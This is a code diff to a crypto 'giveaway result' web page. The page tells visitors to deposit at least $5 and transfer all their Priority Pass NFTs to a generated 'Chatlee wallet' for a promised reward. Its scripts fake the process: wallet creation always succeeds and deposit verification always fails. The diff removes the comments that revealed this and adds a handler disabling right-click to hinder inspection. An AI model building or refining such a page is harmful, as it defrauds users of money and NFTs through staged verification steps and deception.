@@ -5,11 +5,11 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Chatlee Giveaway Result</title>
 
-<!-- FAVICON -->
+
 <link rel="icon" href="/icon.png">
 
 <style>
-/* ================= BASE STYLES ================= */
+/* ================= BASE ================= */
 *{margin:0;padding:0;box-sizing:border-box}
 body{
     font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;
@@ -67,33 +67,30 @@ body{
 .btn:hover::before{width:100%}
 .btn:active{transform:translateY(0)}
 .btn.loading{
-    /* keep the original disabled look */
+    
     pointer-events:none;
     opacity:0.7;
-
-    /* make room for the spinner (18 px) + a little gap */
-    padding-right:44px;               /* 18 px spinner + 12 px gap + 14 px original right‑margin */
-    transition:padding-right .3s ease;/* smooth growth / shrink */
+   
+    padding-right:44px;              
+    transition:padding-right .3s ease;
 }
 
-/* the spinner itself – unchanged except for a slightly smaller right offset
-   (the offset lives inside the extra padding we just added) */
 .btn.loading::after{
     content:"";
     width:18px;
     height:18px;
-    border:3px solid #5CFFB2;          /* colour of the spinner */
-    border-top:3px solid transparent; /* creates the “gap” that spins */
+    border:3px solid #5CFFB2;          
+    border-top:3px solid transparent; 
     border-radius:50%;
     position:absolute;
-    right:12px;                        /* inside the new padding */
+    right:12px;                        
     top:50%;
     transform:translateY(-50%);
     animation:spin .7s linear infinite;
 }
 @keyframes spin{to{transform:translateY(-50%) rotate(360deg)}}
 
-/* small button – for Copy / View Wallet */
+
 .btn-sm{
     padding:6px 12px;font-size:.85rem;margin-left:8px;
 }
@@ -131,7 +128,7 @@ body{
     box-shadow:0 0 8px #00ff9d;
 }
 
-/* ================= INPUT FIELD ================= */
+/* ================= INPUT X ================= */
 .input-field{
     width:100%;padding:10px;margin:10px 0;
     border:1px solid rgba(0,255,157,.4);
@@ -141,7 +138,7 @@ body{
 }
 .input-field:focus{border-color:#00ff9d}
 
-/* ================= TEXT (messages) ================= */
+/* ================= TEXT ================= */
 .success,.failed,.loading-text{
     margin-top:15px;padding:10px;
     border-left:3px solid;display:flex;align-items:center;gap:10px;
@@ -157,7 +154,6 @@ body{
     border-radius:50%;animation:spin 1s linear infinite;
 }
 
-/* hide element (used for messages that start hidden) */
 .hidden{display:none!important}
 
 /* ================= ADDRESS BOX ================= */
@@ -352,7 +348,7 @@ body{
             </div>
         </div>
 
-        <!-- 2️⃣ CREATE YOUR CHATLEE WALLET -->
+        
         <div id="step1" class="card inactive">
             <h3>2. Create Your Chatlee Wallet</h3>
             <p>This Chatlee wallet will also be used for the Chatlee Airdrop and will be directly linked to your account.</p>
@@ -376,7 +372,7 @@ body{
             </div>
         </div>
 
-        <!-- 3️⃣ ONCHAIN DEPOSIT VERIFICATION -->
+       
         <div id="step2" class="card inactive">
             <h3>3. Onchain Deposit Verification</h3>
             <p>Please make a deposit of at least $5 to your Chatlee Wallet for the verification process. This is to ensure anti‑bot and sybil protection. <strong><i>The funds can be withdrawn again after the verification is completed.</i></strong></p>
@@ -388,7 +384,7 @@ body{
         </div>
         </div>
 
-        <!-- 4️⃣ MIGRATE PRIORITY PASS -->
+        
         <div id="step3" class="card inactive">
             <h3>4. Migrate Your Priority Pass to Your Chatlee Wallet</h3>
             <p>Send all your Priority Pass NFTs to your Chatlee wallet. Once the verification is complete, the NFTs will appear in the Inventory tab in your Chatlee account.</p>
@@ -404,7 +400,7 @@ body{
             </div>
         </div>
 
-        <!-- 5️⃣ CHECK YOUR REWARD -->
+        
         <div id="step4" class="card inactive">
             <h3>5. Claim Your Reward</h3>
             <p>Every wallet that holds a Priority Pass NFT is eligible to receive rewards.</p>
@@ -417,7 +413,7 @@ body{
         </div>
     </div>
 
-    <!-- ================= WALLET MODAL ================= -->
+    
     <div id="walletModal" class="wallet-modal">
         <div class="wallet-box">
             <h3>Your Chatlee Wallet</h3>
@@ -468,7 +464,7 @@ body{
         </div>
     </div>
 
-    <!-- ================= NOTIFICATION MODAL ================= -->
+    
     <div id="notificationModal" class="notification-modal">
         <div class="notification-box">
             <p id="notificationMessage"></p>
@@ -505,7 +501,7 @@ function restoreState(){
     const raw = localStorage.getItem('web3SimState');
     if(!raw) return;
     const saved = JSON.parse(raw);
-    if(Date.now() - saved.timestamp > 10*60*1000){   // >10 min old → discard
+    if(Date.now() - saved.timestamp > 10*60*1000){  
         localStorage.removeItem('web3SimState');
         return;
     }
@@ -538,7 +534,7 @@ function restoreState(){
     }
 
     if(appState.walletGenerated){
-        // hide generate button, show success + view‑wallet btn
+        
         document.getElementById('walletBtn').style.display='none';
         document.getElementById('walletLoading').classList.add('hidden');
         document.getElementById('walletSuccess').classList.remove('hidden');
@@ -613,7 +609,7 @@ function verifyUsername(btn){
     },1000);
 }
 
-/* ---------- Wallet creation (always succeeds) ---------- */
+
 function createWallet(btn){
     setLoading(btn,true);
     document.getElementById('walletLoading').classList.remove('hidden');
@@ -638,13 +634,12 @@ function createWallet(btn){
 
         document.getElementById('openWalletBtn').style.display='inline-block';
 
-        // unlock deposit step
+        
         const step2 = document.getElementById('step2');
         step2.classList.remove('inactive'); step2.classList.add('active');
     },5000);
 }
 
-/* ---------- Copy wallet address (custom pop‑up) ---------- */
 function copyAddress(){
     const address = appState.walletAddress || document.getElementById('walletAddress').innerText.trim();
     navigator.clipboard.writeText(address)
@@ -660,17 +655,17 @@ function copyAddress(){
         });
 }
 
-/* ---------- Deposit verification (fails, blocks next step) ---------- */
+
 function verifyDeposit(btn){
     setLoading(btn,true);
     setTimeout(()=>{
         setLoading(btn,false);
         document.getElementById('fail2').classList.remove('hidden');
-        // keep next step blocked – do nothing else
+       
     },1200);
 }
 
-/* ---------- NFT migration (only reachable after a successful deposit) ---------- */
+
 function verifyNFT(btn){
     setLoading(btn,true);
     document.getElementById('fail3').classList.add('hidden');
@@ -678,7 +673,7 @@ function verifyNFT(btn){
 
     setTimeout(()=>{
         setLoading(btn,false);
-        const success = Math.random() < 0.7;   // demo randomness
+        const success = Math.random() < 0.7;   
         if(success){
             document.getElementById('migrationSuccess').classList.remove('hidden');
 
@@ -731,6 +726,12 @@ function send(){
 
 /* ---------- Initialise page from saved state ---------- */
 document.addEventListener('DOMContentLoaded', restoreState);
+
+    document.addEventListener("contextmenu", function(e){
+    e.preventDefault();
+    alert("Right click is disabled on this page.");
+});
+    
 </script>
 </body>
 </html>
